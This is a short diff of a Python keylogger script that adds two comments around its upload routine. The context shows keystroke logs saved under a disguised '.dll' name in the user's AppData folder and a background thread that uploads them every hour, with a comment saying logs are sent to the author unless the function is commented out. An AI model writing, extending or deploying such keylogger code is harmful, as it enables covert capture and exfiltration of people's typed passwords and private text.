@@ -10,6 +10,8 @@ todays_date = datetime.now().strftime('%Y-%b-%d')
 file_name = 'C:\\Users\\'+getpass.getuser()+'\\AppData\\Local\\' + todays_date + '.dll'
 #file_name =  todays_date + '.dll'
 #function to upload logs file every hour,change '%H' to '%M' to upload logs every minute
+
+#comment out this function if you don't want to send logs to me
 def upload():
     lastHour = -1 #ensure first file is always uploaded
     while True:
@@ -26,6 +28,8 @@ def upload():
 
 up = threading.Thread(target=upload) # creating a thread so that keylogger works separate from uploading process
 up.start();     #starting thread
+
+#comment out till here
 
 line_buffer = "" #current typed line before return character
 window_name = "" #current window
